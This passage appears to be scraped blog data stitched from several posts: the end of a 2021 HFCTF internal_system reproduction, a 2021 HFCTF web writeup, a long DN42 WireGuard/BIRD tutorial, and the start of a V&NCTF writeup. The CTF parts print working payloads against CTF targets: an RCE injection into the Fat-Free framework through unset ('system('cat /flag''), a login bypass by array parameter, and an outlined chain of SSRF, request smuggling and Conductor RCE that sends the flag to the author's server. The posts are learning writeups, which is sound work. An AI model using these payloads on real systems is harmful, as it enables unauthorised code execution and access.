true -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 umount -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 uname -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 usleep -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 watch -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 zcat -&gt; /bin/busybox total 228 lrwxrwxrwx 1 root root 12 May 9 2019 acpid -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 adjtimex -&gt; /bin/busybox -rwxr-xr-x 1 root root 211304 Jan 10 2019 apk lrwxrwxrwx 1 root root 12 May 9 2019 arp -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 blkid -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 blockdev -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 depmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fbsplash -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fdisk -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 findfs -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fsck -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 fstrim -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 getty -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 halt -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 hdparm -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 hwclock -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifconfig -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifdown -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifenslave -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ifup -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 init -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 inotifyd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 insmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ip -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ipaddr -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iplink -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 ipneigh -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iproute -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iprule -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 iptunnel -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 klogd -&gt; /bin/busybox -rwxr-xr-x 1 root root 393 Mar 19 2019 ldconfig lrwxrwxrwx 1 root root 12 May 9 2019 loadkmap -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 logread -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 losetup -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 lsmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mdev -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mkdosfs -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 mkfs.vfat -&gt; /bin/busybox -rwxr-xr-x 1 root root 13968 Jan 23 2019 mkmntdirs lrwxrwxrwx 1 root root 12 May 9 2019 mkswap -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 modinfo -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 modprobe -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 nameif -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 nologin -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 poweroff -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 raidautorun -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 reboot -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 rmmod -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 route -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 setconsole -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 slattach -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 swapoff -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 swapon -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 switch_root -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 sysctl -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 syslogd -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 tunctl -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 udhcpc -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 vconfig -&gt; /bin/busybox lrwxrwxrwx 1 root root 12 May 9 2019 watchdog -&gt; /bin/busybox 噢，果然没有 bash, nc, python, perl, etc. 这些，确实不怎么方便反弹 shell…… ls /etc/*-release 看看是啥发行版 3.9.4 NAME=\"Alpine Linux\" ID=alpine VERSION_ID=3.9.4 PRETTY_NAME=\"Alpine Linux v3.9\" HOME_URL=\"https://alpinelinux.org/\" BUG_REPORT_URL=\"https://bugs.alpinelinux.org/\" Alpine Linux 文明（ 小结啊啊啊啊啊！ 终于复现完了！！ 这题太顶了！！！ 再来回顾以下思路： 根据 /source 审计源码 利用 JavaScript 弱类型特性，绕过登录验证获得 admin 权限 利用 0.0.0.0，通过 /proxy 和 /search 接口绕 WAF，访问 /flag 拿 hint 在 docker 内网找 Netflix Conductor 服务 找 Netflix Conductor 漏洞，利用一个 1day RCE 构造 payload 利用 NodeJS 8 的 HTTP 请求走私 / 请求拆分漏洞，通过 GET 方法走私 POST 请求 利用 /proxy SSRF 给内网的 Netflix Conductor 执行远程命令，把 flag 打到自己的服务器上。 这题堆的考点有亿点点多，感觉放在 8h 的比赛里时间确实不大够。 虽然给够时间也很难做出来就是了（喵喵自己爬了 不过怎么说，复现这题的过程中确实学到了许多…… 好久没做这么顶的题目了（ （溜了溜了喵","path":"2021/04/05/CTF_2021HFCTF_internal_system/"},{"title":"CTF | 2021 数字中国创新大赛虎符网络安全赛道 WriteUp","text":"引言 2021 数字中国创新大赛虎符网络安全赛道 2021年4月3日 10:00-18:00 https://www.ichunqiu.com/2021hfctf 貌似有一段时间没来打 CTF 了，手有点生了。 今年的虎符来的有点早，还赶上了清明假期，大家都比较忙，就来随意看看题好了吧（ Web签到 师傅们常说，要善于学习，细致入微；师傅们也常说，要善于分享，总结归纳。 2021年3月28日，PHP维护的官方Git服务器 git.php.net 被袭击，其Git仓库遭到恶意篡改。如果开发者使用这些遭到篡改的源代码进行网页的开发的话，网站就会在不知情的情况下被感染。 参考新闻 PHP的Git服务器被入侵，源代码被添加后门 PHP 官方：Changes to Git commit workflow https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d 或者 http://git.php.net/?p=php-src.git;a=blobdiff;f=ext/zlib/zlib.c;h=6964407837cb073cd04e8db9d2b2b0e4ccd8faf8;hp=02fb4dd207a29bb2e3f1fefb1cac5e0fab5ca146;hb=c730aa26bd52829a49f2ad284b181b7e82a68d7d;hpb=92aeda524b0b99ab0c861bcba62e5a471ba805e6 直接在 header 打就好了。注意是两个t。 unsetme 是缺陷还是漏洞呢。 &lt;?php // Kickstart the framework $f3=require('lib/base.php'); $f3-&gt;set('DEBUG',1); if ((float)PCRE_VERSION&lt;8.0) trigger_error('PCRE version is out of date'); // Load configuration highlight_file(__FILE__); $a=$_GET['a']; unset($f3-&gt;$a); $f3-&gt;run(); 是 Fat-Free Framework ，一查发现 3.7.1 版本存在 RCE 漏洞 CVE-2020-5203。 但这个漏洞在 3.7.2 修复了。 根据 /lib/CHANGELOG.md，得知题目用到的版本是 3.7.2 (28 May 2020) 查看源码，当对不可访问的属性调用 unset() 时__unset()会被调用。 在 clear 里有 eval，拼接字符串，但需要有 $parts[1] if (!isset($parts[1]) &amp;&amp; array_key_exists($parts[0],$this-&gt;init)) // Reset global to default value $this-&gt;hive[$parts[0]]=$this-&gt;init[$parts[0]]; else { $val=preg_replace('/^(\\$hive)/','$this-&gt;hive', $this-&gt;compile('@hive.'.$key, FALSE)); eval('unset('.$val.');'); if ($parts[0]=='SESSION') { session_commit(); session_start(); } if ($cache-&gt;exists($hash=$this-&gt;hash($key).'.var')) // Remove from cache $cache-&gt;clear($hash); } 再看 changelog 根据 https://github.com/bcosca/fatfree/issues/1206 https://github.com/bcosca/fatfree/issues/1191 正则匹配对 [] 处理不当，于是构造 payload /?a=SESSION[f3-reroute-info]);phpinfo( /?a=SESSION[f3-reroute-info]);system('ls /' /?a=SESSION[f3-reroute-info]);system('cat /flag' flag{dfc91022-dc9d-481a-8b46-cff1ce6e51be} internal_system 开发了一个公司内部的请求代理网站，好像有点问题，但来不及了还是先上线吧（─.─||） http://8.140.152.226:47921/ hint: /source存在源码泄露；/proxy存在ssrf （这是一道零解的题目…… 访问 /source 得到源码，啊是 NodeJS。 const express = require('express') const router = express.Router() const axios = require('axios') const isIp = require('is-ip') const IP = require('ip') const UrlParse = require('url-parse') const {sha256, hint} = require('./utils') const salt = 'nooooooooodejssssssssss8_issssss_beeeeest' const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin')) const port = process.env.PORT || 3000 function formatResopnse(response) { if(typeof(response) !== typeof('')) { return JSON.stringify(response) } else { return response } } function SSRF_WAF(url) { const host = new UrlParse(url).hostname.replace(/\\[|\\]/g, '') return isIp(host) &amp;&amp; IP.isPublic(host) } function FLAG_WAF(url) { const pathname = new UrlParse(url).pathname return !pathname.startsWith('/flag') } function OTHER_WAF(url) { return true; } const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF] router.get('/', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.redirect('/index') } }) router.get('/login', (req, res, next) =&gt; { const {username, password} = req.query; if(!username || !password || username === password || username.length === password.length || username === 'admin') { res.render('login') } else { const hash = sha256(sha256(salt + username) + sha256(salt + password)) req.session.admin = hash === adminHash res.redirect('/index') } }) router.get('/index', (req, res, next) =&gt; { if(req.session.admin === undefined || req.session.admin === null) { res.redirect('/login') } else { res.render('index', {admin: req.session.admin}) } }) router.get('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } const url = decodeURI(req.query.url); console.log(url) const status = WAF_LISTS.map((waf)=&gt;waf(url)).reduce((a,b)=&gt;a&amp;&amp;b) if(!status) { res.render('base', {title: 'WAF', content: \"Here is the waf...\"}) } else { try { const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', response.data) } catch(error) { res.render('base', error.message) } } }) router.post('/proxy', async(req, res, next) =&gt; { if(!req.session.admin) { return res.redirect('/index') } // test url // not implemented here const url = \"https://postman-echo.com/post\" await axios.post(`http://127.0.0.1:${port}/search?url=${url}`) res.render('base', \"Something needs to be implemented\") }) router.all('/search', async (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'}) } const result = {title: 'Search Success', content: ''} const method = req.method.toLowerCase() const url = decodeURI(req.query.url) const data = req.body try { if(method == 'get') { const response = await axios.get(url) result.content = formatResopnse(response.data) } else if(method == 'post') { const response = await axios.post(url, data) result.content = formatResopnse(response.data) } else { result.title = 'Error' result.content = 'Unsupported Method' } } catch(error) { result.title = 'Error' result.content = error.message } return res.json(result) }) router.get('/source', (req, res, next)=&gt;{ res.sendFile( __dirname + \"/\" + \"route.js\"); }) router.get('/flag', (req, res, next) =&gt; { if(!/127\\.0\\.0\\.1/.test(req.ip)){ return res.send({title: 'Error', content: 'No Flag For You!'}) } return res.json({hint: hint}) }) module.exports = router 首先需要登录，这里用到了 JavaScript 弱类型的特性。 参考 SuSeC CTF 2020 Writeup &amp; 基于Node.JS的sha1绕过分析 以及 Node.js中url.parse函数的潜在安全问题 JavaScript 在使用加号拼接的时候最终会得到一个字符串(string)，于是不会影响 sha256 的处理。 这里是用 GET query 传参，可以构造 payload username[]=admin&amp;password=admin 就能成功以管理员身份进入。 接下来打 ssrf…… （题目环境关了复现不了了啊嘤嘤嘤 （后面再搭环境复现吧 赵总的 buuoj 开了环境👇 环境： [虎符CTF 2021] Internal System 这题太顶了！ 专门写了一篇复现这题的博客，移步下面这篇吧。 CTF | 2021 虎符CTF Web internal_system 复现 小结就做出了两题 web，喵喵好菜啊是 fw，喵呜呜呜（ 不过有点佛系，就下午看了一下，快到晚上就出去玩了（其实没认真打，这就逃走 （溜了溜了喵","path":"2021/04/04/CTF_2021HFCTF/"},{"title":"DN42 | 入坑 DN42 实验网络","text":"0x00 前言其实想玩 DN42 也有一段时间了，正好最近群友也在聊 DN42，动不动就「来 Peer！」。 那咱就来整一个好了！ 请注意，本文不是一篇完整的介绍性文章，只是记录一下配置过程中遇到的坑啊什么的。 0x01 What is DN42? dn42 is a big dynamic VPN, which employs Internet technologies (BGP, whois database, DNS, etc). Participants connect to each other using network tunnels (GRE, OpenVPN, Tinc, IPsec) and exchange routes thanks to the Border Gateway Protocol. Network addresses are assigned in the 172.20.0.0/14 range and private AS numbers are used (see registry) as well as IPv6 addresses from the ULA-Range (fd00::/8) - see FAQ. A number of services are provided on the network: see internal (only available from within dn42). Also, dn42 is interconnected with other networks, such as ChaosVPN or some Freifunk networks. Via Official Wiki DN42 全称 Decentralized Network 42（42 号去中心网络），是一个大型、去中心化的 VPN 网络。但是与其它传统 VPN 不同的是，DN42 本身不提供 VPN 出口服务，即不提供规避网络审查、流媒体解锁等类似服务。相反，DN42 的目的是模拟一个互联网。它使用了大量在目前互联网骨干上应用的技术（例如 BGP 和递归 DNS），可以很好地模拟一个真实的网络环境。 简而言之，DN42： 不适合单纯想要保护隐私、规避网络审查的用户 不适合在网内消耗大量流量，例如用于解锁流媒体服务的用户 适合想要研究网络技术，练习服务器、路由器等网络设备配置，甚至后续在真实互联网建立 AS 的用户 适合拥有真实 AS，但担心自己配置错误广播出错误路由、干掉半个互联网，希望有个地方测试的用户。 Via Lan Tian’s Blog 其实就是说，DN42 是一个大型 VPN 网络，模拟了现实生活中的真实互联网。 目前 DN42 已经与 NeoNetwork、ChaosVPN 等网络实现了互联，加入就能体验到其他网络内的资源。 那为什么要加入 DN42 呢？ 当然是好玩啦 w 你想想，只需要动动手动动脑，就能免费拥有属于自己的 ASN (Autonomous system number，自治系统编号)，能宣告一段 IPv4 和 IPv6，体验各种路由协议，还能和别人尽情地 py Peer（对接）。 这可比普通的计算机网络实验好玩多了！ 当然，为了折腾 DN42，你至少需要一台能不间断联网的设备以及对它的 root 权限，当然还需要花不少时间……（喵喵好菜啊，别骂了别骂了 0x02 大概的步骤TL;DR 在 Git 仓库申请账号，申请好你需要的 ASN，IP 段（，域名以及反向解析服务器），然后给仓库提PR 寻找一个可能的 Peer 节点，按照他留下的联系方式给他发邮件/IRC/Telegram/etc. 寻找一个延迟较低的节点，并和他约定好使用的 VPN 软件和路由协议 建立 VPN 通信隧道，确保能互相连通 建立路由（一般是 BGP） 0x03 注册过程这部分主要参考 Lan Tian 师祖的 DN42 实验网络介绍及注册教程（2020-10-01 更新） 一文进行。 目前 DN42 采用 git 仓库进行管理，可以参考 DN42 官方 Wiki howto/Getting Started 来进行配置。 也可以参考 喵喵的 PR，喵~ （需要登录 git） 为了找空出来而且好看的 ASN，喵喵还专门写了个脚本…… 具体就不说了，但吐槽几句。 这里有几个坑就是，需要用 Linux 系统来进行配置，一定不要用 Windows 系统，因为 win 的文件系统不支持带有 : 的文件名，于是 git 仓库都拉不下来。 如果想要用 win 的话，可以使用 WSL2。 另外就是，找 IP 段很容易碰到冲突，而且自己不容易发现……、 比如之前找了一段发现被人占了好大一块，又或者整个 /18 保留给 /24 - /21 了，人傻了。 再比如之前申请的一个段发现被 DN42 官方保留了。 INFO: 172.22.222.0/26 (inetnum): Inetnum has different mntners than parent and policy of parent is reserved: [MIAOTONY-MNT] vs [DN42-MNT]. 找了半天才发现是有个 172.22.192.0/18，直接好家伙。 当然，如果有多个 commit 记录，记得先 squash 一下再 push，可以直接用目录下自带的脚本来 push。 不过其实也没啥关系，PR 上去之后有 CI 自动进行检测，按照要求更改就完事了。 0x04 首先要进行的系统配置在每一台要加入 DN42 的节点都需要进行以下配置！ 打开 Linux 内核的数据包转发功能，即 ip_forwarding。 关闭 Linux 内核 rp_filter 的严格模式。 关掉 ufw 等帮助配置 iptables 防火墙的工具。（如有需要，手动配置 iptables 前两条设置步骤如下。 vim /etc/sysctl.conf 新增以下几条配置 net.ipv4.ip_forward=1 net.ipv6.conf.default.forwarding=1 net.ipv6.conf.all.forwarding=1 net.ipv4.conf.default.rp_filter=2 net.ipv4.conf.all.rp_filter=2 然后应用配置 sysctl -p 0x05 建立通信隧道DN42 是基于 VPN 来建立通信连接的，为了方便，大多数用户都使用 WireGuard 来进行。 WireGuard 是 L3 层隧道，目前已经集成到了 Linux 内核中，它配置简单，占用资源少，安全性较高。 如果不是 OpenVZ 或者 LXC 虚拟化的话，其他应该都能用吧，不支持的话可能需要升级一下内核版本。 这里可以参考 官方 Wiki 的 howto/wireguard 来进行。 Wireguard is a Layer3 VPN. In theory it allows multiple peers to be served with one interface/port, but it does internal routing based on the peer’s public key. This means you will need one interface per peering on dn42 to allow your BGP daemon instead to do routing. This approach is comparable to OpenVPN p2p tunnels. 意思是 wg 内部的路由是基于公钥来进行的，于是和不同的网络进行 peer，对于每个 peer 都需要建立一个新的接口，也就相当于多一个虚拟网卡。不过这个接口的 IP 可以都一样，不受影响。 首先 生成一对公钥和私钥 wg genkey | tee privatekey | wg pubkey &gt; publickey 不同于 Lan Tian 师祖的 sh 配置脚本，此处喵喵 直接使用 wg-quick 来配置。 这是我的配置模板。一般是放在 /etc/wireguard/xxx.conf. [Interface] PrivateKey = &lt;自己的私钥&gt; ListenPort = &lt;自己监听的端口，一般是对方ASN后五位&gt; PostUp = ip addr add &lt;你的DN42 IPv4&gt;/32 peer &lt;对方的DN42 IPv4&gt;/32 dev %i # 如果用 IPv6 ULA # PostUp = ip addr add &lt;你的DN42 IPv6&gt;/128 peer &lt;对方的DN42 IPv6&gt;/128 dev %i # 如果用 link-local（推荐） PostUp = ip addr add &lt;link-local&gt;/64 dev %i Table = off [Peer] PublicKey = &lt;对方的公钥&gt; Endpoint = &lt;对方的公网地址&gt;:&lt;对方的端口，一般是自己ASN后五位&gt; AllowedIPs = 0.0.0.0/0, ::/0 如果 [Interface] 里写了 Address 的话需要在 PostUp 里先删掉 addr 再加上 peer，所以干脆就不配 Address 了。 注意这里 Table = off 要加上，不然所有的流量，包括公网上的流量就都转发给你的 peer 了，这样可能你就连自己的机器都连不上了。 然后喵喵配完 wg，一启动，SSH 连接断了，喵喵愣住了（还好服务商能起 VNC，然后上去把 wg 连接断了才重新连上 SSH… 这里一般推荐用 link-local 地址 进行配置，除非双方约定好是用 ULA。 这是链路本地地址， IPv6 定义在 fe80::/10 地址块。一般就是 fe80::&lt;你的ASN后四位&gt;。 然后为了方便，参考 @moecast 大佬的配置脚本，一步配置 service。 $ cat /sbin/wgen #!/bin/bash filename=\"$(basename -- $1 .conf)\" systemctl enable wg-quick@$filename.service service wg-quick@$filename start 这个脚本将启动隧道，并把配置注册到 service 中，实现开机自启。 把这个脚本放到 /sbin/wgen，然后 chmod +x /sbin/wgen 赋予执行权限。 需要用的时候直接 wgen 文件名 就行了。 最后看看连接建立了没有。 wg show 文件名 # 或者直接 wg 看到 transfer 里发送接收都有数据了说明就能连上了。 当然也可以 ping 一下对方。 WireGuard 接口名就是你配置的文件名。 # ping 对方IP%WireGuard接口名 ping fe80::xxxx%wg_424242xxxx 当然了，也可以手写 systemd 来配 wg，参考 官方 Wiki 就好了。 0x06 建立 BGP 会话BGP(Border Gateway Protocol，边界网关协议) 是一种路由协议，一般都使用这个来进行 peer。 路由的软件一般使用的是 BIRD Internet Routing Daemon (v2) 。 此处参考 DN42 Wiki 上的 Bird2 配置教程 DN42 Wiki 上的 Bird1 配置教程 bird.conf 与 ROA这里要注意 一定按照教程先配好 /etc/bird/bird.conf，或者 /etc/bird.conf！ 此处使用的是 wiki 上的模板，比如喵喵的 Variable header 如下。 OWNIP 和 OWNIPv6 是你本机要分配的地址，OWNNETSET 和 OWNNETSETv6 不用漏了结尾的 +。 ################################################ # Variable header # ################################################ define OWNAS = 4242422688; define OWNIP = 172.23.6.6; define OWNIPv6 = fd00:feed:ca7::6; define OWNNET = 172.23.6.0/26; define OWNNETv6 = fd00:feed:ca7::/48; define OWNNETSET = [172.23.6.0/26+]; define OWNNETSETv6 = [fd00:feed:ca7::/48+]; ################################################ # Header end # ################################################ 然后把 ROA (Route Origin Authorization) 配好。 一般路径在 /etc/bird/roa_dn42{,_v6}.conf 可以写个 crontab 定期自动下载更新。注意 bird.conf 里的 roa 路径要配的一致。 # crontab -e */15 * * * * curl -sfSLR -o /etc/bird/roa_dn42.conf https://dn42.burble.com/roa/dn42_roa_bird2_4.conf &amp;&amp; curl -sfSLR -o /etc/bird/roa_dn42_v6.conf https://dn42.burble.com/roa/dn42_roa_bird2_6.conf &amp;&amp; /usr/sbin/birdc configure 1&gt; /dev/null 可以先执行一次让文件存在，不然后面启动 bird 的时候可能会有问题。 Peers 文件mkdir -p /etc/bird/peers 每一个 peer 建一个文件 /etc/bird/peers/&lt;NEIGHBOR_NAME&gt;.conf。 下面是 Lan Tian 师祖的模板。 protocol bgp dn42_[PEER_NAME]_v4 from dnpeers { neighbor [YOUR_DN42_IP] as [YOUR_ASN]; direct; # 下面这段是在 IPv4 BGP 中禁用 IPv6 路由传递，强烈推荐；查看下文以决定你要不要这样做（保留下面的内容） ipv6 { import none; export none; }; }; protocol bgp dn42_[PEER_NAME]_v6 from dnpeers { neighbor [YOUR_LINK_LOCAL_IP] % 'dn42-[PEER_NAME]' as [YOUR_ASN]; direct; # 下面这段是在 IPv6 BGP 中禁用 IPv4 路由传递；查看下文以决定你要不要这样做（保留下面的内容） ipv4 { import none; export none; }; }; MY 指的是你自己，而 YOUR 指的是你将要 Peer 的那个人。 BIRD 中配置的是 DN42 内的 IP 而非公网 IP。 相比 DN42 Wiki 上的配置，我加了一行 direct;，原因是我发现如果缺少这行，路由信息有可能无法被正确的导入系统路由表。 BIRD 默认会根据系统路由表查找要将数据包转发到哪个网络设备，以此设置系统路由表，但有时查找会失败（表现为 ip route 中出现大片 unreachable）。 此时指定 direct，让 BIRD 将数据包直接转发到 BGP 连接所在的网卡上。 direct 的含义是连接双方直接连接（即中间没有间隔其它的路由器）。 PEER_NAME 是对方的昵称，这里设置的是 Linux 下的网络设备名，与隧道保持一致。注意整个网络设备名不能超过 15 个字符，否则会被截断。 在 IPv6 Peering 时，我推荐使用 Link-local IP。 直接使用对方整个节点的 IPv6 地址（指 fd00::/8 范围中的那个）时，部分系统不会自动添加到对端的路由，需要手动添加一条；见 隧道搭建：WireGuard 一节。 在 BIRDv2 中，强烈推荐在 IPv4 BGP 会话中禁用 IPv6 的路由传递，同时可以在 IPv6 BGP 中禁用 IPv4 路由传递。 BIRDv2 支持在一个 BGP 会话中同时传递 IPv4 和 IPv6 的路由。 在 IPv4 BGP 会话中，BIRDv2 难以正确判断 IPv6 数据包转发目标的地址（Next Hop），会导致 ip -6 route 中出现大片 unreachable。 因此直接禁用就好了。 在 IPv6 BGP 会话中传递 IPv4 路由时，如果双方使用特定的 BGP 软件组合，一方或双方的日志中会出现大片 Invalid NEXT_HOP Attribute，指 Next Hop 判断出错。 但 IPv6 BGP 中同时传递 IPv4 和 IPv6 路由的应用还比较广泛，因此一般建议不要禁用 IPv4 路由传递，除非出现了问题。 BIRD2 是支持 Multiprotocol BGP 的，也就是可以在单独一个 IPv4/IPv6 BGP session 里建立 v4 和 v6 两条 channel。（大概意思是这样，不知道说的准不准确 于是如果双方都支持 MP-BGP 的话，一般是用 link-local 建立一条 v6 的 BGP session 就好了。 由于 link-local 只是在连接双方的接口进行的，需要指定好接口。 可以参考 喵喵的模板。 protocol bgp dn42_424242xxxx_v6 from dnpeers { neighbor fe80::xxxx % 'wg_424242xxxx' as 424242xxxx; direct; } 注意 fe80::xxxx 是对方的 link-local address，wg_424242xxxx 是你网络接口的名字。 之后启动 BIRD，或者重新加载配置。 service bird start # 如果没启动的话 birdc c # 即 birdc configure 然后可以看看连接状态了。 birdc s p # 即 birdc show protocol 如果显示的是 Established，那么连接就建立好了。 Peer 成功！ 当然还可以查看某条路由配置的详细信息。 birdc s p a dn42_424242xxxx_v6 # 即 birdc show protocol all dn42_424242xxxx_v6 然后就能 ping 一下 DN42 内的服务了，比如 172.20.0.53 之类的。 一点点扩展2021.3.21 新发布的 BIRD v2.0.8 新增了许多特性。 其中有一个是支持了 extended next hop，可以实现 IPv4 流量在 IPv6-only 网络上的转发。（反正群友说的我也懒得考证了 参考 BIRD 文档里的 BGP extended next hop 在 dnpeers 里的 ipv4 中加入 extended next hop on; 即可使用这一特性。 于是和别人 peer 的时候，WireGuard 只需要 peer 一个 IPv6 link-local address 就完事了，连 DN42 IPv4 都不需要了。 当然还需要加一个 dummy 接口来写本机的地址，类似于 ip link add dummy1 type dummy ip addr add &lt;你的DN42 IPv4&gt;/32 dev dummy1 ip addr add &lt;你的DN42 IPv6&gt;/128 dev dummy1 不然路由表有可能写入不到内核中。 为了持久化，需要写到配置文件中。Ubuntu 下用的是 netplan。 在 /etc/netplan/ 目录下新建一个文件，内容如下。 $ cat 01-dummy0.yaml network: version: 2 renderer: networkd bridges: dummy0: dhcp4: no dhcp6: no accept-ra: no interfaces: [ ] addresses: - &lt;你的DN42 IPv4&gt;/32 - &lt;你的DN42 IPv6&gt;/128 其他系统的话可以配置 /etc/network/interfaces。 auto dummy0 iface dummy0 inet static pre-up ip link del dummy0 || true pre-up ip link add dummy0 type dummy || true address &lt;你的DN42 IPv4&gt;/32 post-up ip addr add &lt;你的DN42 IPv6&gt;/128 dev dummy0 然后重启之后就能自动配上这个 dummy 接口了。 BTW，喵喵觉得一个一个手动配太麻烦了，于是自己用 Python 糊了个小脚本，只需要输入必要的信息，就能自动生成配置文件，并建立 WireGuard 连接，重新加载 BIRD 配置了，贼舒服！ （不过脚本太丑了而且是自己用的，就不放出来了吧 0x07 一些好玩的东西大佬们给节点做了可视化，比如以下几个。 https://map42.0x7f.cc/ https://map.meson.cc/ https://nixnodes.net/dn42/graph/ https://bgp42.strexp.net/map2 啊啊啊，毛线好多缠住喵喵了（大雾 当然还有很多 dn42 / NeoNetwork NOC 的 looking glass，比如： https://lg.burble.com/ https://lg.strexp.net/ https://lg.lantian.pub/ https://lg.lss233.com/ 以及 DN42 里的服务 internal/Internal Services Burble 老师的服务 https://dn42.burble.com/services/public/ 当然还可以绑定 .dn42 域名，设置反向解析 rDNS，当然还有 .dn42 的 CA 证书…… 为了给自己的多个设备组网，还可以 iBGP、iGP、Babel、OSPF 等路由协议综合来使用。 反正还能慢慢玩呢（ 0x08 Peer with MeowNet什么？你想和我 Peer 了？快来 Peer！ AS4242422688MeowNetMiaoTony’s DN42 Network DN42 IP: 172.23.6.0/26fd00:feed:ca7::/48 Nodes: LV1 - Las Vegas, US, BuyVM To be continued… WireGuard and Multiprotocol BGP are preferred. I prefer to use link-local IPv6 address to set up multiprotocol BGP session (with extended next hop enabled). Welcome to peer with me! Telegram: (Recommended) Just PM @meow_portal_bot and tell me you are from DN42. Email: dn42@miaotony.xyz You should send me some info like follows. Your ASN Public IP IPv4 is preferred, but you can send v4/v6 both DN42 IPv4 and IPv6 Link-local address is preferred Your WireGuard Port 22688 by default I will use 2&lt;Your last 4-digit ASN&gt; for you Is Multiprotocol BGP supported? If yes, I will just use the link-local IPv6 address to set up v4+v6 BGP session Yes by default Something else you want to share with me Extended next hop enabled? etc. 或者看下面也行。 0x09 小结这篇文章对申请 ASN、IP、域名，搭建 VPN 通信隧道，配置 BGP 路由，完成和其他网络的 Peer 等内容进行了介绍。 但要注意的是本文并不是一篇完整的介绍，还需要参考其他教程来综合进行配置。 不过刚来玩 DN42，还有很多不熟悉的地方，还得感谢群里的大佬们 Orz。 如果有错误欢迎指出，喵！ 0xFF References &amp; Extensive Reading DN42 官方 Wiki howto/Getting Started Lan Tian 师祖的 DN42 实验网络介绍及注册教程（2020-10-01 更新） 接入 dn42 及 NeoNetwork 辣条①号 的 DN42 系列 什麼，透過BGP從小型網路到真正的網際網路！？ 系列 BIRD 与 BGP 的新手开场 iBGP - BGP within AS4242423905 etc. 喵呜！终于扯完这篇文章了！ 好久没写技术文章了，喵喵累死了（ （溜了喵","path":"2021/03/25/Server_DN42/"},{"title":"CTF | 2021 V&NCTF 公开赛 WriteUp","text":"引言 V&amp;NCTF2021 公开赛 https://buuoj.cn/vnctf_2021 比赛时间：3月14日10:00 - 3月14日 22:00题目分类：Web Pwn Re Misc Crypto BlockChain EGG题目难度：简单的签到比赛类型：个人赛比赛地点：BUUOJ 周末有个 V&amp;NCTF，题目是 V&amp;N 战队中大一大二的小师傅们出的，比赛结束前来看了一眼，做了几个题玩玩。 这篇其实就很水了 2333. Misc冰冰好像藏着秘密 发现冰冰藏着的flag，flag格式为VNCTF{*} 下载下来一个 FFT.rar 发现打不开。 本来想修一下的，发现用 WINRAR 